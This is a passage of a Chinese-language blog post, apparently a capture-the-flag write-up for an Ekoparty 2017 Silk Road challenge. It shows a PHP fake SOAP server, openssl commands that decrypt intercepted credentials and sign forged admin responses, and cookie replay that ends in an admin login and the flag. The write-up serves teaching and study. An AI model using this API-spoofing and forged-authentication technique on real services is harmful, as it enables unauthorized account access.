+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">else if(strstr($input, &#39;getPublicKey&#39;) !== False)
+{
+?&gt;
+…
+&lt;<span style="color:#ff79c6">ns1:getPublicKeyResponse</span>&gt;&lt;<span style="color:#ff79c6">return</span> <span style="color:#50fa7b">xsi:type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span>&gt;-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAttk+ShvJl8x+Gh
+…</code></pre></div>
+<p>下一个请求：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1=</span><span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/&#34;</span> <span style="color:#50fa7b">xmlns:xsd=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#ff79c6">&gt;</span>
+  <span style="color:#ff79c6">&lt;SOAP-ENV:Body&gt;</span>
+    <span style="color:#ff79c6">&lt;ns1:checkCredentials&gt;</span>
+      <span style="color:#ff79c6">&lt;username</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>ez8cHs/i4U28hMZV1yJnnJtaDbS7H89mJKPXIe8iIJevy2bIVguYP6CpNNPXU3xPY3Jmz/KccsN1Q2Am/rmh2yiQGqHnE69ljocuNSmTYxf0S5nLODYFFlEkK4SnUhbNV1fOFnQkq9xKFhYjNCr0+aMArSxLdi3GWGxY3Ri6ozlKZ6UHL5wo50JomBYWBRPP4ZiOGoh7PcjOTQhccj/aqT5QkJOKqraPAHMSgVopykIbkOZZK2K7UEI4NtzSN/S9ZbmtmZqlMKevSXzQVnt4cx9HNE4pDam784pGjcbc4iTCWErTniUlTMmgBcUeGPv4sMuIqRPwsS6tIdynN0RpvA==<span style="color:#ff79c6">&lt;/username&gt;</span>
+      <span style="color:#ff79c6">&lt;password</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>BtotLqmqRnQEZ5zHOBNksmpLnKX2O/FXYMahEBy0+HKkoxnBoPiZVl9HyMWxph4aRup/hjFFtB1wJI09xHR/MRr4mxQS7KRhiiRTNTAI9HpWVmFY6tBufeDhylP98M6Aukk7cjHM6dy0vJ0Dc5qqRGHhmLWqdc98xZAxdYlLuLs8YZSmWIMVUp+WM2jhHi2VK67Vr/v/fyz+GYvdKgvGZfpIRPCxw4D9NBaCecNqMkICggxsBnzPR2AXA6z3CK8mC6McCEz+B6YoU6n3ehIrHLd0oLNDiQ8ZPfKnDQdJaP/48inrF/uH2qnSoJbV8ozLNecVH22QUMPQ3Ve+FU1KkQ==<span style="color:#ff79c6">&lt;/password&gt;</span>
+      <span style="color:#ff79c6">&lt;return_format</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>hYgDX7iTGO9PQ19YvgSkqw8lbkKfSDlKZaQD6R7QaUgW9GtcsaZMhO8NRoZ85AVnE/igOo4ck9BG9U/l6aw14Lw75/Kg13+zhb4NihVF+KCdJUgLKuZM9wv4Y0f5xtt9QnBoHxJZzG9qsRwJiZ5t3pBeV2u3M9wX0grUcY9KRaTioUqaSLkhZL7hnxjlB5sQWALG6/xLDU9K0/Iv3ETJ+iev3UPcBbpVYIL27ewg/p35jAUGs2Wd8/UJab0l0xfdMvavpmIT21v81tyUf9uDrGFMD0D4g8qNpbcazconekMs5Ut7WCWZHO81leNJhVUyBMWw+0IaSGPJI8RGbZhvcw==<span style="color:#ff79c6">&lt;/return_format&gt;</span>
+    <span style="color:#ff79c6">&lt;/ns1:checkCredentials&gt;</span>
+  <span style="color:#ff79c6">&lt;/SOAP-ENV:Body&gt;</span>
+<span style="color:#ff79c6">&lt;/SOAP-ENV:Envelope&gt;</span></code></pre></div>
+<p>这些字符串是 base64 编码的，解码后，看起来像一些随机数据 —— 让我们尝试用我们的私钥，解密它：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ base64 -d <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#f1fa8c">&#34;ez8cHs/i4U28hMZV1...&#34;</span> | openssl rsautl -decrypt -inkey my_key/private_key.pem
+admin
+
+$ base64 -d <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#f1fa8c">&#34;BtotLqmqRnQE...&#34;</span> | openssl rsautl -decrypt -inkey my_key/private_key.pem
+admin
+$ base64 -d <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#f1fa8c">&#34;hYgDX7iTGO9PQ19Yv...&#34;</span> | openssl rsautl -decrypt -inkey my_key/private_key.pem
+<span style="color:#6272a4">#LEVEL#|#ACTIVE#|#USERNAME#</span></code></pre></div>
+<p>对 SOAP API 发送查询，会向我们显示正确的响应格式：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1=</span><span style="color:#f1fa8c">&#34;http://localhost/&#34;</span> <span style="color:#50fa7b">xmlns:xsd=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#ff79c6">&gt;</span>
+  <span style="color:#ff79c6">&lt;SOAP-ENV:Body&gt;</span>
+    <span style="color:#ff79c6">&lt;ns1:checkCredentialsResponse&gt;</span>
+      <span style="color:#ff79c6">&lt;return</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>brAeciqgRwohqYYGxutpv8Cu4x35VWi0EjMaTYpaN...<span style="color:#ff79c6">&lt;/return&gt;</span>
+    <span style="color:#ff79c6">&lt;/ns1:checkCredentialsResponse&gt;</span>
+  <span style="color:#ff79c6">&lt;/SOAP-ENV:Body&gt;</span>
+<span style="color:#ff79c6">&lt;/SOAP-ENV:Envelope&gt;</span></code></pre></div>
+<p>我们假设数据是使用 SOAP API 的私钥加密的，并且网页使用从 API 接收到的公钥，进行解密。让我们尝试一下，按照上面收到的格式，编写我们的响应，然后使用我们的私钥，对其进行加密：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#8be9fd;font-style:italic">echo</span> -ne <span style="color:#f1fa8c">&#34;100|true|admin&#34;</span> | openssl rsautl -sign -inkey private_key.pem | base64
+XiX4AaisveD9KlBoNaRpkgSEYpp48U60kLZx5RWHH3+i68cupt0r5O7MEKSNuYEi97cuKs7+v12X
+wPay2FKGR4J9icuPEcvaJVZT8j0ptMvM9i6sFnLsGD93oXIntyYLDSNUvqzQAP7y0fR2hZHtHQCD
+wwtQt7qwJZuJPobMNXcSK8jcXmV5EqF0JvYKlwm5aszTYP5/5mo0hGE2FMuNv/5CgXQcI2XocyDO
+guGd9fALzwB3Fxt6K7PLpoJ2pg4Ln99t0EWfGxXqYzCqLi8Jx8HFCl4dFVSJ37IuqmUPvl1brTkD
+<span style="color:#8be9fd;font-style:italic">SrD0t20YtF6awDhnAYTJ9HQcMuvcMLW6XpQcIA</span><span style="color:#ff79c6">==</span></code></pre></div>
+<p>我们已经构建了，对我们的假 SOAP 服务器的另一个正确响应，让我们将其添加到脚本中：</p>
+
+<blockquote>
+<p>假的 SOAP 服务器 – part 4</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?php</span>
+<span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (strstr(<span style="color:#8be9fd;font-style:italic">$input</span>, <span style="color:#f1fa8c">&#39;checkCredentials&#39;</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">False</span>)
+{
+<span style="color:#ff79c6">?&gt;</span>
+<span style="color:#ff79c6">&lt;?</span>xml version<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span><span style="color:#ff79c6">?&gt;</span>
+&lt;<span style="color:#ff79c6">SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://localhost/&#34;</span> <span style="color:#50fa7b">xmlns:xsd</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span>&gt;
+  &lt;<span style="color:#ff79c6">SOAP-ENV:Body</span>&gt;
+    &lt;<span style="color:#ff79c6">ns1:checkCredentialsResponse</span>&gt;
+      &lt;<span style="color:#ff79c6">return</span> <span style="color:#50fa7b">xsi:type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span>&gt;axB28P6hYR+u275oPz...&lt;/<span style="color:#ff79c6">return</span>&gt;
+    &lt;/<span style="color:#ff79c6">ns1:checkCredentialsResponse</span>&gt;
+  &lt;/<span style="color:#ff79c6">SOAP-ENV:Body</span>&gt;
+&lt;/<span style="color:#ff79c6">SOAP-ENV:Envelope</span>&gt;
+</code></pre></div>
+<p>我们的伪 API，得到的下一个请求：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1=</span><span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/&#34;</span> <span style="color:#50fa7b">xmlns:xsd=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#ff79c6">&gt;</span>
+  <span style="color:#ff79c6">&lt;SOAP-ENV:Body&gt;</span>
+    <span style="color:#ff79c6">&lt;ns1:getUserDetails&gt;</span>
+      <span style="color:#ff79c6">&lt;username</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>e/5P1tjauBTvtQWus1+1ijGjI/PMA40JVLMe//RBQukNClchs71NbJFfeMav2/ihPu6BP7JhAqJqTPz3FVUjdazFNcekFvydA1kWj8thI8XbeY0jC7MRNLOnjeWqbK7aOehHTWRirvoq7yD1FTjz/YKPR0ou6FoOpvCngZy3xjaQ08wEH2hEs6AadADvB8yLDPgzdncaTCh9ZmX2WfdHIgHIuZkrtnBTE6iKaup44UF2u8VxhoraaHnNfSHlakd3sD8W50iZgksA+cqb5kguOqVAikUJqKs3Xv0G4UojIiFjayOwWCTP21uHn6yOM/Qy8VnAzhgjUWYW53LxWG21FA==<span style="color:#ff79c6">&lt;/username&gt;</span>
+    <span style="color:#ff79c6">&lt;/ns1:getUserDetails&gt;</span>
+  <span style="color:#ff79c6">&lt;/SOAP-ENV:Body&gt;</span>
+<span style="color:#ff79c6">&lt;/SOAP-ENV:Envelope&gt;</span></code></pre></div>
+<p>很好–似乎我们通过了身份验证。对真实 API 发送查询，并带上使用服务器公钥加密的用户名，我们将看到另一种正确的响应格式：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1=</span><span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/&#34;</span> <span style="color:#50fa7b">xmlns:xsd=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#ff79c6">&gt;</span>
+  <span style="color:#ff79c6">&lt;SOAP-ENV:Body&gt;</span>
+    <span style="color:#ff79c6">&lt;ns1:getUserDetails&gt;</span>
+      <span style="color:#ff79c6">&lt;username</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>e/5P1tjauBTvtQWus1+1ijGjI/PMA40JVLMe//RBQukNClchs71NbJFfeMav2/ihPu6BP7JhAqJqTPz3FVUjdazFNcekFvydA1kWj8thI8XbeY0jC7MRNLOnjeWqbK7aOehHTWRirvoq7yD1FTjz/YKPR0ou6FoOpvCngZy3xjaQ08wEH2hEs6AadADvB8yLDPgzdncaTCh9ZmX2WfdHIgHIuZkrtnBTE6iKaup44UF2u8VxhoraaHnNfSHlakd3sD8W50iZgksA+cqb5kguOqVAikUJqKs3Xv0G4UojIiFjayOwWCTP21uHn6yOM/Qy8VnAzhgjUWYW53LxWG21FA==<span style="color:#ff79c6">&lt;/username&gt;</span>
+    <span style="color:#ff79c6">&lt;/ns1:getUserDetails&gt;</span>
+  <span style="color:#ff79c6">&lt;/SOAP-ENV:Body&gt;</span>
+<span style="color:#ff79c6">&lt;/SOAP-ENV:Envelope&gt;</span></code></pre></div>
+<p>使用服务器的公钥，解密消息可以得到：</p>
+
+<pre><code>a:3:{s:6:&quot;orders&quot;;s:1:&quot;0&quot;;s:3:&quot;btc&quot;;s:1:&quot;0&quot;;s:8:&quot;messages&quot;;s:1:&quot;0&quot;;}
+</code></pre>
+
+<p>这使用了标准 php <code>serialize</code> 方法，是一个包含用户详细信息的序列化结构。</p>
+
+<p>再来 —— 让我们用我们的私钥加密它，并为我们的假 SOAP 脚本，添加另一个条件。最后一个请求和 …</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ torify curl -v -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/&#34;</span>
+HTTP/1.1 <span style="color:#bd93f9">200</span> OK
+Date: Mon, <span style="color:#bd93f9">18</span> Sep <span style="color:#bd93f9">2017</span> <span style="color:#bd93f9">11</span>:10:02 GMT
+Server: Apache
+Set-Cookie: <span style="color:#8be9fd;font-style:italic">PHPSESSID</span><span style="color:#ff79c6">=</span>rsg6p15vnm7quglb9kte9e9sb0; <span style="color:#8be9fd;font-style:italic">path</span><span style="color:#ff79c6">=</span>/
+Expires: Thu, <span style="color:#bd93f9">19</span> Nov <span style="color:#bd93f9">1981</span> <span style="color:#bd93f9">08</span>:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Location: /
+Pragma: no-cache
+X-Powered-By: PHP/7.0.8
+Content-Type: text/html; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>UTF-8
+
+…</code></pre></div>
+<p>没有新的 SOAP 请求，我们收到了 <code>Location</code>标头，告诉我们刷新页面。让我们在浏览器中，设置接收到的 <code>PHPSESSID</code> cookie，并打开挑战的网页 —— 这次没有 <code>Proxy</code>标头，因此剩余的通信将调用真正的 API 。很好，我们以管理员身份登录！很遗憾，我们看不到任何旗帜。我们花了一些时间，尝试更改 <code>getUserDetails</code> 响应，但解决方案要简单得多 —— 我们只需要以 <code>DPR</code> 用户身份登录（我们从挑战描述中，获取，它是原丝绸之路创始人的名字），并在 <code>checkCredentialsResponse</code> 中设置高级别（10000000）。然后，瞧 —— 得分旗帜出现在了用户消息中：
+<code>EKO{dread_by_p0xy}</code></p>
+
+  </div>
+
+<br>
+  
+
+<button id="edit-button" class="icon-button" type="button" title="Fork and edit" aria-label="Fork and edit"
+aria-haspopup="true" aria-expanded="false" aria-controls="edit">
+<i class="fa fa-edit">编辑本文</i>
+</button>
+
+
+<br>
+
+
+
+<script src="/pass-blog/js/copyCode.js"></script>
+<script src="/pass-blog/js/tooltips.js"></script>
+
+
+<footer>
+    <p style="float:right;margin:0 1rem;">
+        &copy; 2019 <a href="https://github.com/chinanf-boy/pass-blog/issues">yobrave (Issue me).</a>
+        
+      </p>
+  <hr>
+  <hr>
+
+  
+
+  <ul class="tags"  style="float: left!important;">
+      
+        <span>标签:</span>
+        <li><a class="link" href="/pass-blog/tags/codisec%20CTF"> #codisec CTF </a></li>
+      
+      <span>  </span>
+        
+        <span>分类:</span>
+        <li><a class="link" href="/pass-blog/categories/blog"> #blog </a></li>
+      
+  </ul>
+  
+  <br>
+
+
+</footer>
+</div> 
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+  crossorigin="anonymous"></script>
+<script src="https://netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-128555056-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-128555056-1');
+</script>
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.4/dist/medium-zoom.min.js"></script>
+
+<script>
+  const zoom = mediumZoom()
+  
+  zoom.attach("img")
+</script>
+
+
+
+
+
+
+<script>
+        document.getElementById("edit-button").addEventListener("click", function () {
+            var editWindow = window.open("https:\/\/github.com\/chinanf-boy\/pass-blog/edit/master/content/post\/Ekoparty-2017:-丝绸之路.md");
+        });</script>
+
+    
+
+
+
+
+</body>
+
+</html>
